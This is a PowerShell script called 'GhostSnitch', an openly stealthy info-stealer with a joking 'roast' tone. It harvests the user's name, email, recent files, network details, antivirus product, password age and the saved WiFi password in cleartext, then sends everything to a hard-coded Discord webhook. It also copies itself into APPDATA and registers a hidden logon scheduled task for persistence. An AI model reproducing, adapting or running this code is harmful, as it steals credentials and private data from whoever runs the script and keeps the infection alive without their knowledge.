####################################################################################################
# Title       : GhostSnitch
# Version     : 1.3 (Stealth)
# Author      : I am TBJr
# Description : Curiosity was the spark, but roasting you is the flame. Stealth delivery first.
####################################################################################################

# Auto-elevate if not running as Administrator
#If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`
#    [Security.Principal.WindowsBuiltInRole]::Administrator)) {
#    Start-Process powershell -Verb runAs -ArgumentList "-ExecutionPolicy Bypass -File `\"$PSCommandPath`\""
#    exit
#}

function Get-FullName {
    try {
        $fullName = (net user $env:username | Select-String -Pattern "Full Name").ToString().Split(":")[1].Trim()
    } catch {
        $fullName = $env:username
    }
    return $fullName
}
$fullName = Get-FullName

function Get-UserInfo { "User: $env:USERNAME on $env:COMPUTERNAME" }
function Get-Email {
    try {
        $email = (gpresult /z | Select-String -Pattern "\S+@\S+").Matches.Value
        return "Email: $email"
    } catch { return "Email not found" }
}
function Get-OS { (Get-CimInstance Win32_OperatingSystem).Caption }
function Get-Uptime {
    $boot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $up = New-TimeSpan -Start $boot -End (Get-Date)
    return "$($up.Days) days, $($up.Hours) hrs"
}
function Get-DriveStats {
    (Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        "$($_.Name): $([int]($_.Used/1GB))GB used / $([int]($_.Free/1GB))GB free"
    }) -join "`n"
}
function Get-RecentFiles {
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending | Select-Object -First 5 |
            ForEach-Object { $_.Name } | Out-String
}
function Get-USB {
    try { (Get-PnpDevice -Class 'USB').FriendlyName -join ", " } catch { "No USB info found" }
}
function Get-BitLocker {
    try {
        (Get-BitLockerVolume | Select-Object MountPoint, ProtectionStatus | ForEach-Object {
            "$($_.MountPoint): $($_.ProtectionStatus)"
        }) -join ", "
    } catch { "BitLocker status unknown" }
}
function Get-NetworkInfo {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike '169.*' }).IPAddress | Select-Object -First 1
    $mac = (Get-NetAdapter | Where-Object Status -eq 'Up').MacAddress | Select-Object -First 1
    return "Local IP: $ip, MAC: $mac"
}
function Get-Antivirus {
    try { (Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct).displayName -join ", " } catch { "No antivirus info" }
}
function Get-TopProcesses {
    Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5 |
            ForEach-Object { "$($_.ProcessName): $([math]::Round($_.WorkingSet/1MB,1))MB" } | Out-String
}
function Get-RAM {
    try {
        $RAM = (Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
        $RAM = [int]$RAM
        if ($RAM -lt 4) { "$RAM GB? Powered by hopes and prayers." }
        elseif ($RAM -lt 8) { "$RAM GB? Barely enough to load your regrets." }
        elseif ($RAM -lt 16) { "$RAM GB? Gamer vibes. With lag." }
        else { "$RAM GB? Respect. But no firewall? Lol." }
    } catch { "RAM detection failed." }
}
function Get-PubIP {
    try { (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content.Trim() } catch { "No public IP" }
}
function Get-WifiPass {
    try {
        $ssid = (netsh wlan show interface | Select-String ' SSID ').ToString().Split(":")[1].Trim()
        $pass = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content').ToString().Split(":")[1].Trim()
        "$ssid password: $pass"
    } catch { "No WiFi pass found" }
}
function Get-PasswordAge {
    try {
        $line = (net user $env:UserName | Select-String "Password last set").ToString()
        $days = (New-TimeSpan -Start $line.Split(':')[1].Trim() -End (Get-Date)).Days
        "$days days since last password set"
    } catch { "Password age unknown" }
}

# Send log to Discord immediately
$webhook = 'https://discord.com/api/webhooks/1364536515954348032/3H6tkezlhYibD9CB6qAE62ON__BTvWcGEtuihmz7NylPZOhDYcjO0gq8BOuS-lLvDBBg'
$payload = @{
    username = "👻 GhostSnitch (Stealth)"
    content = "🕵️ Stealth log received from `$env:COMPUTERNAME"
    embeds = @(@{
        title = "GhostSnitch Report for $fullName"
        color = 65280
        fields = @(
            @{ name = "🧑‍💻 User Info"; value = (Get-UserInfo); inline = $true },
            @{ name = "📧 Email Roast"; value = (Get-Email); inline = $false },
            @{ name = "🖥️ OS"; value = (Get-OS); inline = $true },
            @{ name = "⏱️ Uptime"; value = (Get-Uptime); inline = $true },
            @{ name = "💽 Drives"; value = (Get-DriveStats); inline = $false },
            @{ name = "🗃️ Recent Files"; value = (Get-RecentFiles); inline = $false },
            @{ name = "🔌 USB Devices"; value = (Get-USB); inline = $false },
            @{ name = "🔐 BitLocker"; value = (Get-BitLocker); inline = $true },
            @{ name = "🌐 Network"; value = (Get-NetworkInfo); inline = $true },
            @{ name = "🛡️ Antivirus"; value = (Get-Antivirus); inline = $false },
            @{ name = "🔄 Top Processes"; value = (Get-TopProcesses); inline = $false },
            @{ name = "💾 RAM Roast"; value = (Get-RAM); inline = $true },
            @{ name = "🌍 Public IP"; value = (Get-PubIP); inline = $true },
            @{ name = "📶 WiFi Password"; value = (Get-WifiPass); inline = $false },
            @{ name = "🔒 Password Age"; value = (Get-PasswordAge); inline = $false }
        )
        timestamp = (Get-Date).ToString("o")
    })
}
Invoke-RestMethod -Uri $webhook -Method Post -Body (ConvertTo-Json $payload -Depth 10) -ContentType 'application/json'

# Create scheduled task for persistence
$dest = "$env:APPDATA\ghostsnitch.ps1"
Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $dest -Force
$task = "schtasks /create /f /sc onlogon /tn GhostSnitch /tr 'powershell -w h -NoP -NonI -Ep Bypass -File `\"$dest`\"'"
Invoke-Expression $task
